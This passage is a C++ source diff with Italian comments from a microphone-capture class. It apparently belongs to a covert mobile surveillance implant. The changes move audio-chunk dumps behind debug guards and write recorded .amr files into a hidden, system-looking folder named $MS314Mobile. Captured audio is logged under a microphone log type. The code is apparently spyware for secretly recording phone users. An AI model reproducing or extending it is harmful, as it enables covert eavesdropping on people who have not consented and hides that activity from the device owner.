@@ -69,9 +69,10 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 
 	//1MB di buffer
 	static BYTE bufferTmp[1024*512];
-
+#ifdef _DEBUG
 	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
-	char nomeFile[sizeof("audio")+DTTMSZAUD+1+6];
+	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio")+DTTMSZAUD+1+6];
+#endif
 	
 	Log log;
 
@@ -142,16 +143,16 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 #ifdef _DEBUG
 		WCHAR msg[128];
 		swprintf_s(msg, L"\n3exit) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
-#endif
+
 
 		//dovrei entrare qua dentro solo quando stoppo il processo per cui mi trovo un trunk non completo
 		fstream filestr;
-		sprintf(nomeFile,"audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
+		sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
 		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
 		filestr.seekg (0, ios::beg);
 		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
 		filestr.close();
-
+#endif
 		if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
 			{
 				return;
@@ -185,16 +186,16 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 #ifdef _DEBUG
 			WCHAR msg[128];
 			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%i\n",NativeCapture::pos,NativeCapture::nCamp,hnsPresentationTime);OutputDebugString(msg);
-#endif
+
 
 
 			fstream filestr;
-			sprintf(nomeFile,"audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
+			sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
 			filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
 			filestr.seekg (0, ios::beg);
 			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
 			filestr.close();
-
+#endif
 			if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
 			{
 				return;
